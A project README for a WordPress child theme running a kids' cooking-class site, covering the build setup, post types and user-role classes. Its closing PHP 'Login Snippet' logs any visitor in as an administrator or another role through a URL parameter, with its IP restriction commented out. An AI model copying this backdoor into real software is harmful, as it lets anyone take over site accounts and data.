# Front-end Task Runner

## Required Software

1. Latest version of [NodeJS](http://nodejs.org/) (min v0.12.2)
2. Windows only - [GitBash](http://git-scm.com/downloads) (used instead of cmd)
3. Windows only - [GraphicsMagick](http://sourceforge.net/projects/graphicsmagick/files/graphicsmagick-binaries/1.3.21/)

## Install the dependencies

Use GitBash on Windows or Terminal on OSX / Linux in the theme directory.

`$ npm install --global gulp && npm install`

## Watching for changes

Use this command when you start work on the project:

`$ gulp`

This will start a process that watches for changes on the source files in the theme(e.g. postcss, templates, etc), and compile the bundle for you.

## Build the app

You should build once you're done with the changes. This will take care of time consuming tasks like optimizing the images and creating sprites.

$ `gulp build`

# Backend functionallity

## Warning

Carbons are extended here, do not update version !!!

### Concept

The site covers the organization of cooking classes for kids.

The site has 2 special user types - Session Admins and Facilitators. The Session Admins are the people who provide the location, one session admin can manage multiple locations and can create classes for each location. The Facilitators are the lectors. They see the classes they need to attend, and can create and assign recipes for the classes.

### Structure

The custom code is part of the `kids-test-kitchen` theme, which is a child theme of the `Pluto` theme.

There are 4 post types - `Location`, `Class`, `Date`, `Recipe`.
 * The `Location` post type represents actual schools/locations/buildings
 * The `Calss` post type represents a different group at the specific location
 * The `Date` post type is a hidden post type, which is populated from the content of a complex field located in the `Class` post type edit screen.
 * The `Recipe` post type allows the creation of the recipes that will be used during the classes. The Recipe is actually assigned to a Date.

### Objects

#### Init

Each of the post types has a different object to initialize them. All of the init objects are assigned to a global variables.

 * Crb_Initialize_Base - an abstract class with the common elements of the post types to be registered
 * Crb_Initialize_Org - Initializes the `Org` post typ
 * Crb_Initialize_Location - Initializes the `Location` post type
 * Crb_Initialize_Class - Initializes the `Class` post type
 * Crb_Initialize_Date - Initializes the `Date` post type
 * Crb_Initialize_Recipe - Initializes the `Recipe` post type

Each of the user types has a different object to initialize them. The user objects are using the post type init objects to setup capabilities correctly.

 * Crb_User_Initialize_Base
 * Crb_User_Initialize_Admin
 * Crb_User_Initialize_Facilitator
 * Crb_User_Initialize_Session_Admin

There is also the need of updating the registration form to require specific additional data collection during the registration process:

 * Crb_User_Register

#### Post Types

Each of the following objects hold the entire logic needed when working with specific post type.

* Crb_Location
* Crb_Class
* Crb_Date
* Crb_Recipe

#### Other objects

 * Crb_Cache_Booster - boosts cache, aka deletes some transients
 * Crb_Cron - hooks the daily emails
 * Crb_User - wraps all of the user functionallity needed througout the site
 * Crb_Current_User - Singleton for the current user, object of type Crb_User
 * Crb_Mail - handles sending emails
 * Crb_Replace_Submit_Meta_Box - Override the default submit meta box, cleaning and modifying it.
 * Crb_WooCommerce - Holds the WooCommerce theme integration

### Login Snippet

```
<?php
// Use either of the 3 parameters bellow to login into the site as one of the 3 types of users
// ?login=administrator
// ?login=crb_session_admin
// ?login=crb_facilitator
if (
	// Security Level 1 - WP Core loaded
	function_exists('is_user_logged_in')
	&&
	// Security Level 2 - Only support can access
	// in_array( $_SERVER['REMOTE_ADDR'], array( '212.36.31.70', '127.0.0.1' ) )
	// &&
	// Security Level 3 - Get param
	isset($_GET['login'])
) {
	if ( !is_user_logged_in() || ! current_user_can( $_GET['login'] ) ) {
		$admins = get_users(array('role'=>$_GET['login']));
		if ( ! empty( $admins ) && ! empty( $admins[0] ) ) {
			wp_set_auth_cookie($admins[0]->ID, true);
			wp_redirect($_SERVER['REQUEST_URI']);
			exit;
		}
	}
}
?>
```
